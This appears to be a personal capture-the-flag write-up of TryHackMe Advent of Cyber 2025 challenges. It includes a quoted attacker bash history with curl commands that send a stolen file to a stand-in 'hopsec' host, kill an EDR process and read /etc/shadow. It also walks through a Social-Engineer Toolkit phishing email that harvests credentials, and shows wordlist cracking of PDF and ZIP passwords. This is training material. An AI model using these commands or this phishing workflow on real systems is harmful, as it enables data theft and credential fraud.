# Day 1

## My Solve

```
mcskidy@tbfc-web01:~$ cd Guides
mcskidy@tbfc-web01:~/Guides$ ls
mcskidy@tbfc-web01:~/Guides$ ls -a
.  ..  .guide.txt
mcskidy@tbfc-web01:~/Guides$ cat .guide.txt
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!

P.S. Great job finding the guide. Your flag is:
-----------------------------------------------
THM{learning-linux-cli}
-----------------------------------------------
```  

Flag#1 :`THM{learning-linux-cli} `

```
mcskidy@tbfc-web01:~$ cd /home/socmas/2025
mcskidy@tbfc-web01:/home/socmas/2025$ cat eggstrike.sh
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{sir-carrotbane-attacks}
```

Flag#2 : `THM{sir-carrotbane-attacks}`

```

mcskidy@tbfc-web01:~$ sudo su
root@tbfc-web01:/home/mcskidy$ cd /root
root@tbfc-web01:~$ cat .bash_history
whoami
cd ~
ll 
nano .ssh/authorized_keys 
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
pkill tbfcedr
cat /etc/shadow
cat /etc/hosts
exit
cd /root
```

Flag#3 : `THM{until-we-meet-again}`

```
root@tbfc-web01:~$ sudo su
root@tbfc-web01:~$ cd /home/mcskidy/Documents/
root@tbfc-web01:/home/mcskidy/Documents$ ls -a
.  ..  read-me-please.txt
root@tbfc-web01:/home/mcskidy/Documents$ cat read*
From: mcskidy
To: whoever finds this

I had a short second when no one was watching. I used it.

I've managed to plant a few clues around the account.
If you can get into the user below and look carefully,
those three little "easter eggs" will combine into a passcode
that unlocks a further message that I encrypted in the
/home/eddi_knapp/Documents/ directory.
I didn't want the wrong eyes to see it.

Access the user account:
username: eddi_knapp
password: S0mething1Sc0ming

There are three hidden easter eggs.
They combine to form the passcode to open my encrypted vault.

Clues (one for each egg):

1)
I ride with your session, not with your chest of files.
Open the little bag your shell carries when you arrive.

2)
The tree shows today; the rings remember yesterday.
Read the ledger’s older pages.

3)
When pixels sleep, their tails sometimes whisper plain words.
Listen to the tail.

Find the fragments, join them in order, and use the resulting passcode
to decrypt the message I left. Be careful — I had to be quick,
and I left only enough to get help.

~ McSkidy
```

***

# Day 2

## My Solve

```
           ,..-,
         ,;;f^^"""-._
        ;;'          `-.
       ;/               `.
       ||  _______________\_______________________
       ||  |HHHHHHHHHHPo"~~\"o?HHHHHHHHHHHHHHHHHHH|
       ||  |HHHHHHHHHP-._   \,'?HHHHHHHHHHHHHHHHHH|
        |  |HP;""?HH|    """ |_.|HHP^^HHHHHHHHHHHH|
        |  |HHHb. ?H|___..--"|  |HP ,dHHHPo'|HHHHH|
        `| |HHHHHb.?Hb    .--J-dHP,dHHPo'_.rdHHHHH|
         \ |HHHi.`;;.H`-./__/-'H_,--'/;rdHHHHHHHHH|
           |HHHboo.\ `|"\"/"\" '/\ .'dHHHHHHHHHHHH|
           |HHHHHHb`-|.  \|  \ / \/ dHHHHHHHHHHHHH|
           |HHHHHHHHb| \ |\   |\ |`|HHHHHHHHHHHHHH|
           |HHHHHHHHHb  \| \  | \| |HHHHHHHHHHHHHH|
           |HHHHHHHHHHb |\  \|  |\|HHHHHHHHHHHHHHH|
           |HHHHHHHHHHHb| \  |  / dHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHb  \/ \/ .fHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHH| /\ /\ |HHHHHHHHHHHHHHHH|
           |""""""""""""""""""""""""""""""""""""""|
           |,;=====.     ,-.  =.       ,=,,=====. |
           |||     '    //"\\   \\   //  ||     ' |
           |||         ,/' `\.  `\. ,/'  ``=====. |
           |||     .   //"""\\   \\_//    .     |||
           |`;=====' =''     ``=  `-'     `=====''|
           |______________________________________|
	

[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!


5
 Unable to check for new version of SET (is your network up?)

 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.

set> 
   Social Engineer Toolkit Mass E-Mailer

   There are two options on the mass e-mailer, the first would
   be to send an email to one individual person. The second option
   will allow you to import a list and send it to as many people as
   you want within that list.

   What do you want to do:

    1.  E-Mail Attack Single Email Address
    2.  E-Mail Attack Mass Mailer

    99. Return to main menu.
   
set:mailer>1
set:phishing> Send email to:factory@wareville.thm

  1. Use a gmail Account for your email attack.
  2. Use your own server or open relay

set:phishing>2
set:phishing> From address (ex: moo@example.com):updates@flyingdeer.thm
set:phishing> The FROM NAME the user will see:Flying Deer
set:phishing> Username for open-relay [blank]:
Password for open-relay [blank]: 
set:phishing> SMTP email server address (ex. smtp.youremailserveryouown.com):10.49.191.90
set:phishing> Port number for the SMTP server [25]:
set:phishing> Flag this message/s as high priority? [yes|no]:no
Do you want to attach a file - [y/n]: n
Do you want to attach an inline file - [y/n]: n
set:phishing> Email subject:shipping schedule changes
set:phishing> Send the message as html or plain? 'h' or 'p' [p]:
[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.
set:phishing> Enter the body of the message, type END (capitals) when finished:please login to confirm new shipping charges at http://10.49.160.204:8000
Next line of the body: Thank you for your service
Next line of the body: END
[*] SET has finished sending the emails

      Press <return> to continue
  
```

Terminal 2: 

```
root@ip-10-49-160-204:~# cd ~/Rooms/AoC2025/Day02
root@ip-10-49-160-204:~/Rooms/AoC2025/Day02# ./server.py
Starting server on http://0.0.0.0:8000
10.49.191.90 - - [10/Dec/2025 06:48:01] "GET / HTTP/1.1" 200 -
[2025-12-10 06:48:01] Captured -> username: admin    password: unranked-wisdom-anthem    from: 10.49.191.90
10.49.191.90 - - [10/Dec/2025 06:48:01] "POST /submit HTTP/1.1" 303 -
10.49.191.90 - - [10/Dec/2025 06:48:01] "GET / HTTP/1.1" 200 -

```

Flag 1 : `unranked-wisdom-anthem`

<img width="793" height="244" alt="image" src="https://github.com/user-attachments/assets/61cb88df-0c9c-4f8b-aa07-143c749f8d09" />

Flag 2 : `1984000`

***

# Day 9 : Passwords - A Cracking Christmas

## My Solve


1. ``pdfcrack -f flag.pdf -w /usr/share/wordlists/rockyou.txt``
*  password: `naughtylist`
2. ``zip2john flag.zip > ziphash.txt ``
*  password : `winter4ever`

Flag 1 : `THM{Cr4ck1ng_PDFs_1s_34$y}`

Flag 2: `THM{Cr4ck1n6_z1p$_1s_34$yyyy}`

